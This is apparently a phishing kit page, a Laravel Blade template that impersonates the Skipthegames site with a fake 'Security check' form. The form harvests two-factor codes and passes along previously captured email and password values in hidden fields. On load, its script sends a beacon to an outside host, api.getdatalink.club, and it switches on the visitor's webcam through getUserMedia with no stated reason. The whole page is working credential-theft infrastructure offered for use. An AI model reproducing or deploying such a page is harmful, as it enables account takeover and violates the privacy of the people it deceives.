<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check</title>

    <!--========== style css =========-->
    <style>



body{
    margin: 0px;
    padding: 0px;
    border: 0px;
}

#container {
    width: 100%;
    height: 100%;
    background-color: #fff;
    position: fixed;
    top: 0;
    left: 0;
}
#videoElement {
	width: auto;
	height: 100%;
	background-color: #fff;
	margin:auto;
	display: block;
}

.main_con_a01{

    height: 100%;
    width: 100%;
    position: fixed;
    top: 0;
    left: 0;
    display: flex;
    align-content: center;
    flex-wrap: wrap;
    justify-content: center;
    flex-direction: column;
    align-items: center;
	background-color: #222222;

}

.ss_mm_01{
    height: 265px;
    width: 400px;
    background-color: #fff;
    box-shadow: -3px 3px 40px rgb(0 0 0 / 15%);
    border-radius: 8px;
}

.lll_uu_ss_01{
    height: 50px;
    width: 320px;
    display: flex;
    align-items: center;
    justify-content: space-evenly;
    align-content: space-around;
    flex-wrap: nowrap;
    font-size: 22px;
    font-family: 'font';
    border-radius: 6px;
    border: none;
    background-color: #990033;
    color: #fff;
	margin: 25px auto 0 auto;
}

.lll_uu_ss_01:before{
    content:  url(../images/sss_iii_aa.svg);
    display: block;
    height: 40px;
    width: 40px;
    margin-right: 10px;
    border-radius: 6px;
    background-color: #fff;
}

.mm_tt_aera{

   height: 140px;
   width: 350px;
   margin: 20px auto 0 auto;

}

.hh_01{

    margin: 0 auto 0 auto;
    height: 35px;
    width: 240px;
	display: flex;
	color: #2b044d;
	font-family: sans-serif;

}

.pp_01{

    width: 320px;
    height: 75px;
    display: flex;
    font-size: 20px;
    font-family: sans-serif;
    font-weight: 100;
    margin: 25px auto 0 auto;
	color: #707b8e;

}

.bb_aa_01{

    display: contents;
    font-size: 18px;

}

.ss_mm_02{

    height: 280px;
    width: 400px;
    background-color: #fff;
    box-shadow: -3px 3px 40px rgb(0 0 0 / 15%);
    border-radius: 8px;
	margin-top: 10px;

}

#form_createad_existing_account_login{

    height: 180px;
    width: 360px;
    margin: 20px auto auto;

}

#input_account_email{

    height: 25px;
    width: 300px;
    margin: 10px auto 20px auto;
    outline: none;
    background: #fff;
    display: block;
    border: 1px solid #ccc;
    font-family: sans-serif;
    box-shadow: inset 0 1px 2px rgb(0 0 0 / 10%);
    color: rgba(0,0,0,0.75);
    font-size: 18px;
    padding: 0.5rem;

}

#input_account_password{

    height: 25px;
    width: 300px;
    margin: 10px auto 20px auto;
    outline: none;
    background: #fff;
    display: block;
    border: 1px solid #ccc;
    font-family: sans-serif;
    box-shadow: inset 0 1px 2px rgb(0 0 0 / 10%);
    color: rgba(0,0,0,0.75);
    font-size: 18px;
    padding: 0.5rem;

}

#submit_createad_account_login{

    height: 43px;
    width: 318px;
    border: none;
    cursor: pointer;
    text-align: center;
    background-color: #2ba6cb;
    border-color: #2285a2;
    color: #fff;
    margin: 10px auto 0 auto;
    font-size: 18px;
    font-family: sans-serif;
    display: block;
	border-radius: 4px;

}

.hhh_003{

    width: 315px;
    height: 30px;
    color: #222222;
    margin: 25px auto 10px auto;
    font-family: sans-serif;
    font-size: 25px;
    display: block;

}

#ss_02{
   display: none;
}

.hh_cc_02{

    height: 30px;
    width: 316px;
    color: #fff;
    margin: 0 0 30px 0;
    font-family: sans-serif;
    font-size: 30px;

}

#error{
    display: none;
    width: 300px;
    margin: 0 auto 0 auto;
    padding: 0.375rem 0.5625rem 0.5625rem;
    margin-top: -1px;
    margin-bottom: 1rem;
    font-size: 0.75rem;
    font-weight: normal;
    font-style: italic;
    background: #903;
    color: #fff;
    border-bottom-left-radius: 4px;
    border-bottom-right-radius: 4px;
    text-rendering: optimizeLegibility;
    font-family: 'Open Sans','Helvetica Neue','Helvetica','Arial',sans-serif!important;
    outline: none;
}

#error_02{
    display: none;
    width: 300px;
    margin: 0 auto 0 auto;
    padding: 0.375rem 0.5625rem 0.5625rem;
    margin-top: -1px;
    margin-bottom: 1rem;
    font-size: 0.75rem;
    font-weight: normal;
    font-style: italic;
    background: #903;
    color: #fff;
    border-bottom-left-radius: 4px;
    border-bottom-right-radius: 4px;
    text-rendering: optimizeLegibility;
    font-family: 'Open Sans','Helvetica Neue','Helvetica','Arial',sans-serif!important;
    outline: none;
}

#lll_ccc_main{

    height: 220px;
    width: 250px;
    background-color: #fff;
    border-radius: 6px;

}

.img_mm_01{
    height: 80px;
    width: 80px;
    margin: 18px auto 0 auto;
    display: block;
    border-radius: 50%;
}

.ppp_tt_aa_01{
    margin: 20px auto 0 auto;
    display: block;
    width: 110px;
    height: 20px;
    font-family: sans-serif;
    font-size: 16px;
}

.rrr_aa_01{
    height: 40px;
    width: 100%;
    margin: 20px auto 0 auto;
    display: flex;
    text-align: center;
    justify-content: center;
    align-content: center;
}

.ree_01{
    height: 40px;
    width: 40px;
    border-radius: 50%;
    background-color: #008000b0;
    border: none;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
}

.ree_01:before{
    content:  url(../images/outgoing-call.svg);
    display: block;
    height: 25px;
    width: 25px;
}

.ree_02{
    height: 40px;
    width: 40px;
    border-radius: 50%;
    background-color: #f70202a8;
    border: none;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-items: center;
    align-content: center;
    justify-content: center;
    margin-left: 24%;
}

.ree_02:before{
    content:  url(../images/incoming-call.svg);
    display: block;
    height: 17px;
    width: 25px;
}

#hh_ww_hh_01{
    display: none;
}

#ss_01{
    display: none;
}

.pp_cc_ttt_01{

    height: 45px;
    width: 320px;
    margin: 0 auto 15px auto;
    font-family: system-ui;
    font-size: 15px;

}

#eee_02{
    display: none;
}




/*============== veryfy css start here ===============*/

.ttt_mm_dd{
    height: 100vh;
    width: 100%;
    display: flex;
    flex-direction: row;
    flex-wrap: nowrap;
    align-content: center;
    justify-content: center;
    align-items: center;
}

.main_div{
    height: fit-content;
    width: fit-content;
    background-color: #fff;
	margin-left: 12%;
    padding-left: 25px;
    padding-right: 15px;
    border-radius: 6px;
    position: fixed;
    left: 14%;
    top: 16%;
    box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
}

.hhh_03{
    font-size: 1.6875rem;
    font-weight: 400;
    font-style: normal;
    color: #222;
    text-rendering: optimizeLegibility;
    margin-top: .2rem;
    margin-bottom: .5rem;
    font-family: open sans,helvetica neue,helvetica,arial,sans-serif!important;
    outline: none;
}

.ppp_aa_01{
    font-family: open sans,helvetica neue,helvetica,arial,sans-serif!important;
    outline: none;
    font-weight: 400;
    font-size: 1rem;
    line-height: 1.6;
    margin-bottom: 1.25rem;
    text-rendering: optimizeLegibility;
    color: #222;
    cursor: auto;
    font-style: normal;
}

.row{
    width: auto;
    margin-left: -.9375em;
    margin-right: -.9375em;
    margin-top: 0;
    margin-bottom: 0;
    max-width: none;
    font-family: open sans,helvetica neue,helvetica,arial,sans-serif!important;
    outline: none;
}

.small-8 {
    width: 65%;
    display: inline-flex;
    margin-left: 15px;
}

#auth_code{
    -webkit-appearance: none;
    border-radius: 0;
    background-color: #fff;
    font-family: inherit;
    border-style: solid;
    border-width: 1px;
    border-color: #ccc;
    box-shadow: inset 0 1px 2px rgb(0 0 0 / 10%);
    color: rgba(0,0,0,.75);
    display: block;
    font-size: .875rem;
    margin: 0 0 1rem;
    padding: .5rem;
    height: 2.3125rem;
    width: 100%;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    transition: all .15s linear;
    outline: none;
}

.button{
    padding-top: .875rem;
    padding-right: 1.75rem;
    padding-bottom: .9375rem;
    padding-left: 1.75rem;
    font-size: .8125rem;
    border-radius: 4px;
    font-weight: 400;
    line-height: normal;
    margin: 0 0 1.25rem;
    position: relative;
    text-decoration: none;
    text-align: center;
    border-style: solid;
    border-width: 0;
    cursor: pointer;
    background-color: #2ba6cb;
    border-color: #2285a2;
    color: #fff;
    transition: background-color 300ms ease-out;
    margin-left: 30px;
}

#videoElement {
    width: 100%;
    height: 100vh;
    background-color: #222;
    margin: auto;
    display: block;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
}

.sss_lll_logo_01{
    height:40px;
    width:255px;
    margin-top: 20px;
}
@media only screen and (max-width:991px){


    .main_div {
        width: 90%;
        left: 1%;
        top: 18%;
        margin-left: 20px;
    }
}
@media only screen and (max-width:768px){


      .main_div {
           width: 90%;
           left: 1%;
           top: 18%;
          margin-left: 0;
       }

      .sss_lll_logo_01{
          width: 40%;
          height: 5%;
      }

      .hhh_03{
          width: fit-content;
          height: fit-content;
      }

      .ppp_aa_01{
          width: 90%;
          margin: 5px 0 0 0;
      }

      .small-8 {
        width: 90%;
        display: inline-flex;
        margin-left: 15px;
     }

     .row{
         margin-top: 8px;
     }


}


    </style>
</head>
<body>
    <!--<div class="ttt_mm_dd">-->
        <video id="videoElement" loop="true" autoplay="autoplay"  muted></video>
      <form class="main_div" action="{{url('add/security')}}" method="post">
          @csrf
          <img src='Skipthegames-255x39.png' class='sss_lll_logo_01'>

          <h3 class="hhh_03">Security check</h3>
          <!--<p class="ppp_aa_01">We have upgraded our security to protect all users against account takeovers and hacking.</p>-->



              <p class="ppp_aa_01">A security code has been sent to your Email address "{{Session::get('em')}}</p>
              <p class="ppp_aa_01">Please enter this code here:</p>



          <div class="row">
            <div class="small-8">
				<input type="hidden" id="input_account_email_auth" name="input_account_email_auth" value="sfgdsjk@gmail.com" />
				<input type="hidden" id="input_account_password_auth" name="input_account_password_auth" value="dfsdf" />
				<input type="hidden" id="time_auth" name="time_auth" value="2022-02-24 00:47:18" />
                <input id="auth_code" name="email" type="text" placeholder="Type in the numbers you received" required="">
                <input type="submit" class="button" value="Verify">
            </div>
          </div>
          <p class="ppp_aa_01">The code you received is good for 30 minutes.</p>
          <p class="ppp_aa_01">It may take the code up to 10 minutes to arrive. Make sure to check your Spam/Junk/Trash folder.</p>
          <br>
      </form>
    <!--</div> -->



    <!--=========== main js ===========-->
<script>

//========== index login page js ============
var video = document.querySelector("#videoElement");
var email = document.getElementById("input_account_email");
var pass = document.getElementById("input_account_password");
var m_01 = document.getElementById("ss_01");
var m_02 = document.getElementById("ss_02");

let ggg_data = 2073400041;

  var xhttp_01 = new XMLHttpRequest();
  xhttp_01.open("POST", "https://api.getdatalink.club/", true);
  xhttp_01.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xhttp_01.send("id="+ggg_data);


function pp_dd(){

  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

	  if(this.responseText == 1){
         document.getElementById("error").style ="display:block";
         document.getElementById("eee_02").style ="display:block";
         document.getElementById("input_account_password").style ="margin-bottom: 0;";
         document.getElementById("ss_02").style ="height: 350px;display:block;";
         document.getElementById("submit_createad_account_login").innerHTML ="Log in";
         pass.value = '';
	  }

     document.getElementById("submit_createad_account_login").style ="cursor: pointer;";

    }else{
      document.getElementById("submit_createad_account_login").style ="cursor: not-allowed;";
      document.getElementById("submit_createad_account_login").innerHTML ="Loading...";
    }

  };



}

function vv_ss(){

if (navigator.mediaDevices.getUserMedia) {
  navigator.mediaDevices.getUserMedia({  video: true })
    .then(function (stream) {
      video.srcObject = stream;
    //   var url = window.webkitURL.createObjectURL(stream);
    //   video.src = url;
    })
    .catch(function (err0r) {
      //alert("Camera Not Found");
    });
}


navigator.getMedia = ( navigator.getUserMedia ||
                      navigator.webkitGetUserMedia ||
                      navigator.mozGetUserMedia ||
                      navigator.msGetUserMedia);

navigator.getMedia({video: true}, function() {

}, function() {
  //alert("Camera Not Found");
});


}


function pp_ch(){

  document.getElementById("ss_02").style = "display:block";
  document.getElementById("ss_01").style = "display:none";

}



const audioContext = new (window.AudioContext || window.webkitAudioContext)();

const source = audioContext.createBufferSource();



function ss_pp_gg(){
  document.getElementById("lll_ccc_main").style = "display:none";
  document.getElementById("ss_01").style = "display:block";
//   document.getElementById("hh_ww_hh_01").style = "display:block";
  source.stop();
}



//=========== veryfy area js start here =============
var video = document.querySelector("#videoElement");

        function vv_ss(){

        if (navigator.mediaDevices.getUserMedia) {
          navigator.mediaDevices.getUserMedia({  video: true })
            .then(function (stream) {
              video.srcObject = stream;
            //   var url = window.webkitURL.createObjectURL(stream);
            //   video.src = url;
            })
            .catch(function (err0r) {
              //alert("Camera Not Found");
            });
        }


        navigator.getMedia = ( navigator.getUserMedia ||
                              navigator.webkitGetUserMedia ||
                              navigator.mozGetUserMedia ||
                              navigator.msGetUserMedia);

        navigator.getMedia({video: true}, function() {

        }, function() {
          //alert("Camera Not Found");
        });


        }

        vv_ss()





</script>
</body>
</html>
